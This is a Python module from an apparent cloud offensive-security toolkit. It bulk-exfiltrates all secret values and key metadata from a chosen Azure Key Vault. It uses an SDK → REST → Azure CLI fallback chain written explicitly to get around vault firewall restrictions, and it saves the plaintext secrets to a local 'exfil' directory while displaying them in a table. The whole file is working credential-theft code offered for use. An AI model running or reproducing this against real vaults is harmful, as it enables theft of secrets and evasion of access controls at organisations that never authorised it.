# src/clouds/azure/modules/exfiltration/keyvault_exfil.py

import json
import subprocess
from datetime import datetime
from typing import Any, Dict, List, Optional

import requests
from rich.console import Console
from rich.prompt import Prompt, Confirm
from rich.table import Table

from azure.keyvault.secrets import SecretClient
from azure.core.exceptions import HttpResponseError

from ...azure_session import AzureSessionManager, AccessTokenCredential
from ...utils.error_handler import handle_azure_error

console = Console()


class _AzCliTokenExpiredError(Exception):
    """Raised when the Azure CLI session token is expired."""
    pass


# ---------------------------------------------------------------------------
# Public entry point
# ---------------------------------------------------------------------------

def exfiltrate_keyvault(session_mgr: AzureSessionManager) -> None:
    """
    Exfiltrate secrets (and optionally keys) from an Azure Key Vault.

    Fallback chain for firewall-restricted vaults:
      1. Azure SDK  (SecretClient / KeyClient)
      2. REST API   (same bearer token, no extra login)
      3. Azure CLI  (az keyvault secret/key show — handles "trusted service" bypass)
    """

    # Single auth upfront — no second browser popup later
    access_token = session_mgr.get_access_token(scope="vault")
    if not access_token:
        console.print("[red]Authentication required. Use one of the login commands first.[/red]")
        return

    vault_name = Prompt.ask("[cyan]Key Vault name[/cyan]").strip()
    if not vault_name:
        console.print("[red]Key Vault name is required.[/red]")
        return

    also_keys = Confirm.ask("[cyan]Also exfiltrate keys metadata?[/cyan]", default=False)

    vault_url = f"https://{vault_name}.vault.azure.net"
    console.print(f"[cyan]Target: {vault_url}[/cyan]")

    # -----------------------------------------------------------------------
    # 1. Collect secrets with values
    # -----------------------------------------------------------------------
    secrets = _collect_secrets(session_mgr, vault_name, vault_url, access_token)
    if secrets is None:
        return  # fatal error already printed

    # -----------------------------------------------------------------------
    # 2. Optionally collect key metadata
    # -----------------------------------------------------------------------
    keys: List[Dict[str, Any]] = []
    if also_keys:
        keys = _collect_keys(session_mgr, vault_name, vault_url, access_token)

    if not secrets and not keys:
        console.print("[yellow]Nothing found to exfiltrate.[/yellow]")
        return

    # -----------------------------------------------------------------------
    # 3. Save to exfil directory
    # -----------------------------------------------------------------------
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    exfil_dir = session_mgr.get_exfil_dir("keyvault")
    out_file = exfil_dir / f"{vault_name}_{timestamp}.json"

    payload = {
        "vault": vault_name,
        "vault_url": vault_url,
        "timestamp": timestamp,
        "secrets": secrets,
        "keys": keys,
    }

    with open(out_file, "w") as f:
        json.dump(payload, f, indent=2)

    # -----------------------------------------------------------------------
    # 4. Display results
    # -----------------------------------------------------------------------
    if secrets:
        table = Table(
            title=f"Secrets — {vault_name} ({len(secrets)} found)",
            show_lines=False,
        )
        table.add_column("Name", style="cyan")
        table.add_column("Value", style="yellow", overflow="fold", no_wrap=False)
        table.add_column("Enabled", style="green")
        table.add_column("Content Type", style="magenta")

        for s in secrets:
            attrs = s.get("attributes", {})
            table.add_row(
                s.get("name", ""),
                s.get("value", "[dim]<no value>[/dim]"),
                "Yes" if attrs.get("enabled", True) else "No",
                s.get("contentType", ""),
            )
        console.print(table)

    if keys:
        ktable = Table(
            title=f"Keys — {vault_name} ({len(keys)} found)",
            show_lines=False,
        )
        ktable.add_column("Name", style="cyan")
        ktable.add_column("Type", style="magenta")
        ktable.add_column("Enabled", style="green")
        ktable.add_column("ID", style="white", overflow="fold", no_wrap=False)

        for k in keys:
            attrs = k.get("attributes", {})
            ktable.add_row(
                k.get("name", ""),
                k.get("keyType", ""),
                "Yes" if attrs.get("enabled", True) else "No",
                k.get("id", ""),
            )
        console.print(ktable)

    console.print(f"[green]Saved to: {out_file.resolve()}[/green]")
    console.print(
        f"[green]Exfiltrated {len(secrets)} secret(s)"
        + (f" and {len(keys)} key(s)" if keys else "")
        + ".[/green]"
    )


# ---------------------------------------------------------------------------
# Secret collection — fallback chain
# ---------------------------------------------------------------------------

def _collect_secrets(
    session_mgr: AzureSessionManager,
    vault_name: str,
    vault_url: str,
    access_token: str,
) -> Optional[List[Dict[str, Any]]]:
    """
    Returns list of secret dicts (with values), or None on fatal error.
    Tries SDK → REST → CLI in order.
    """

    # -- 1. SDK ---------------------------------------------------------------
    console.print("[dim]Trying SDK...[/dim]")
    sdk_credential = AccessTokenCredential(token=access_token)
    try:
        client = SecretClient(vault_url=vault_url, credential=sdk_credential)
        results = []
        for prop in client.list_properties_of_secrets():
            secret = client.get_secret(prop.name)
            results.append(_normalize_sdk_secret(secret))
        console.print(f"[green]SDK: {len(results)} secret(s) retrieved.[/green]")
        return results

    except HttpResponseError as e:
        if e.status_code == 403 and "ForbiddenByFirewall" in str(e):
            console.print("[yellow]SDK blocked by firewall. Trying REST API...[/yellow]")
        else:
            handle_azure_error(e, "exfiltrating Key Vault secrets", vault_name)
            return None
    except Exception as e:
        handle_azure_error(e, "exfiltrating Key Vault secrets", vault_name)
        return None

    # -- 2. REST API ----------------------------------------------------------
    rest_result = _collect_secrets_via_rest(vault_url, access_token)
    if rest_result is not None:
        return rest_result

    console.print("[yellow]REST API blocked. Trying Azure CLI...[/yellow]")

    # -- 3. CLI ---------------------------------------------------------------
    return _collect_secrets_via_cli(session_mgr, vault_name)


def _collect_secrets_via_rest(
    vault_url: str, access_token: str
) -> Optional[List[Dict[str, Any]]]:
    """
    Returns list of secret dicts (with values) via REST, or None if blocked/error.
    """
    headers = {"Authorization": f"Bearer {access_token}"}

    # List secret names
    try:
        resp = requests.get(
            f"{vault_url}/secrets?api-version=7.4",
            headers=headers, timeout=30
        )
        resp.raise_for_status()
        items = resp.json().get("value", [])
    except requests.exceptions.RequestException as e:
        console.print(f"[yellow]REST list failed: {e}[/yellow]")
        return None

    results = []
    for item in items:
        sid = item.get("id", "")
        name = sid.split("/secrets/")[-1].split("/")[0] if "/secrets/" in sid else ""
        if not name:
            continue
        # Get value
        try:
            vresp = requests.get(
                f"{vault_url}/secrets/{name}?api-version=7.4",
                headers=headers, timeout=30
            )
            vresp.raise_for_status()
            vdata = vresp.json()
            results.append({
                "id": vdata.get("id", sid),
                "name": name,
                "value": vdata.get("value", ""),
                "contentType": vdata.get("contentType", ""),
                "attributes": vdata.get("attributes", {}),
            })
        except requests.exceptions.RequestException as e:
            console.print(f"[yellow]REST get '{name}' failed: {e}[/yellow]")
            # Keep partial result without value
            results.append({
                "id": sid, "name": name, "value": None,
                "contentType": item.get("contentType", ""),
                "attributes": item.get("attributes", {}),
            })

    console.print(f"[green]REST: {len(results)} secret(s) retrieved.[/green]")
    return results


def _collect_secrets_via_cli(
    session_mgr: AzureSessionManager, vault_name: str
) -> Optional[List[Dict[str, Any]]]:
    """
    Returns list of secret dicts (with values) via Azure CLI, or None on error.
    Offers az login if the CLI token is expired.
    """
    try:
        return _cli_list_and_fetch_secrets(vault_name)
    except _AzCliTokenExpiredError:
        console.print("[yellow]Azure CLI session token is expired.[/yellow]")
        if not Confirm.ask("[cyan]Run 'az login' now?[/cyan]", default=True):
            return None
        tenant_id = session_mgr.current_session_data.get("tenant_id")
        az_cmd = ["az", "login"]
        if tenant_id:
            az_cmd += ["--tenant", tenant_id]
        proc = subprocess.run(az_cmd, timeout=120)
        if proc.returncode != 0:
            console.print("[red]az login failed.[/red]")
            return None
        try:
            return _cli_list_and_fetch_secrets(vault_name)
        except _AzCliTokenExpiredError:
            console.print("[red]Still expired after az login. Run 'az logout && az login'.[/red]")
            return None


def _cli_list_and_fetch_secrets(vault_name: str) -> List[Dict[str, Any]]:
    """
    Lists secret names via CLI then fetches each value.
    Raises _AzCliTokenExpiredError if the CLI token is expired.
    """
    # List names
    list_result = subprocess.run(
        ["az", "keyvault", "secret", "list", "--vault-name", vault_name, "--output", "json"],
        capture_output=True, text=True, timeout=60,
    )
    _check_cli_result(list_result)

    try:
        items = json.loads(list_result.stdout)
    except json.JSONDecodeError as e:
        console.print(f"[red]Failed to parse CLI output: {e}[/red]")
        return []

    results = []
    for item in items:
        sid = item.get("id", "")
        name = sid.split("/secrets/")[-1].split("/")[0] if "/secrets/" in sid else item.get("name", "")
        if not name:
            continue

        show_result = subprocess.run(
            ["az", "keyvault", "secret", "show", "--vault-name", vault_name, "--name", name, "--output", "json"],
            capture_output=True, text=True, timeout=30,
        )
        if show_result.returncode != 0:
            stderr = show_result.stderr.strip()
            if "AADSTS50173" in stderr or "TokensValidFrom" in stderr:
                raise _AzCliTokenExpiredError(stderr)
            console.print(f"[yellow]CLI get '{name}' failed: {stderr}[/yellow]")
            attrs = item.get("attributes", {})
            results.append({"id": sid, "name": name, "value": None,
                            "contentType": item.get("contentType", ""), "attributes": attrs})
            continue

        try:
            vdata = json.loads(show_result.stdout)
            attrs = vdata.get("attributes", {})
            results.append({
                "id": vdata.get("id", sid),
                "name": name,
                "value": vdata.get("value", ""),
                "contentType": vdata.get("contentType", ""),
                "attributes": {
                    "enabled": attrs.get("enabled", True),
                    "created": attrs.get("created", ""),
                    "updated": attrs.get("updated", ""),
                    "expires": attrs.get("expires", ""),
                },
            })
        except json.JSONDecodeError:
            results.append({"id": sid, "name": name, "value": None,
                            "contentType": "", "attributes": {}})

    console.print(f"[green]CLI: {len(results)} secret(s) retrieved.[/green]")
    return results


def _check_cli_result(result: subprocess.CompletedProcess) -> None:
    """Raises _AzCliTokenExpiredError or prints error for non-zero exit."""
    if result.returncode != 0:
        stderr = result.stderr.strip()
        if "AADSTS50173" in stderr or "TokensValidFrom" in stderr:
            raise _AzCliTokenExpiredError(stderr)
        console.print(f"[red]az CLI error: {stderr}[/red]")
        raise RuntimeError("CLI command failed")


# ---------------------------------------------------------------------------
# Key collection — fallback chain (metadata only)
# ---------------------------------------------------------------------------

def _collect_keys(
    session_mgr: AzureSessionManager,
    vault_name: str,
    vault_url: str,
    access_token: str,
) -> List[Dict[str, Any]]:
    """
    Returns list of key metadata dicts (no private key material — not exportable by default).
    Tries REST → CLI in order. Returns [] on any failure (non-fatal).
    """

    # -- 1. REST API ----------------------------------------------------------
    try:
        headers = {"Authorization": f"Bearer {access_token}"}
        resp = requests.get(
            f"{vault_url}/keys?api-version=7.4",
            headers=headers, timeout=30
        )
        resp.raise_for_status()
        items = resp.json().get("value", [])
        results = []
        for item in items:
            kid = item.get("kid", "")
            name = kid.split("/keys/")[-1].split("/")[0] if "/keys/" in kid else ""
            results.append({
                "id": kid,
                "name": name,
                "keyType": item.get("kty", ""),
                "attributes": item.get("attributes", {}),
            })
        console.print(f"[green]REST: {len(results)} key(s) retrieved.[/green]")
        return results
    except requests.exceptions.RequestException as e:
        console.print(f"[yellow]REST keys blocked: {e}. Trying CLI...[/yellow]")

    # -- 3. CLI ---------------------------------------------------------------
    try:
        result = subprocess.run(
            ["az", "keyvault", "key", "list", "--vault-name", vault_name, "--output", "json"],
            capture_output=True, text=True, timeout=60,
        )
        _check_cli_result(result)
        items = json.loads(result.stdout)
        results = []
        for item in items:
            kid = item.get("kid", item.get("key", {}).get("kid", ""))
            name = kid.split("/keys/")[-1].split("/")[0] if "/keys/" in kid else item.get("name", "")
            attrs = item.get("attributes", {})
            results.append({
                "id": kid,
                "name": name,
                "keyType": item.get("kty", ""),
                "attributes": {
                    "enabled": attrs.get("enabled", True),
                    "created": attrs.get("created", ""),
                    "updated": attrs.get("updated", ""),
                    "expires": attrs.get("expires", ""),
                },
            })
        console.print(f"[green]CLI: {len(results)} key(s) retrieved.[/green]")
        return results
    except _AzCliTokenExpiredError:
        console.print("[yellow]CLI token expired for key listing — skipping keys.[/yellow]")
        return []
    except Exception as e:
        console.print(f"[yellow]CLI key listing failed: {e}[/yellow]")
        return []


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _normalize_sdk_secret(secret) -> Dict[str, Any]:
    props = secret.properties
    return {
        "id": props.id,
        "name": props.name,
        "value": secret.value,
        "contentType": props.content_type or "",
        "attributes": {
            "enabled": props.enabled,
            "created": props.created_on.isoformat() if props.created_on else None,
            "updated": props.updated_on.isoformat() if props.updated_on else None,
            "expires": props.expires_on.isoformat() if props.expires_on else None,
        },
    }
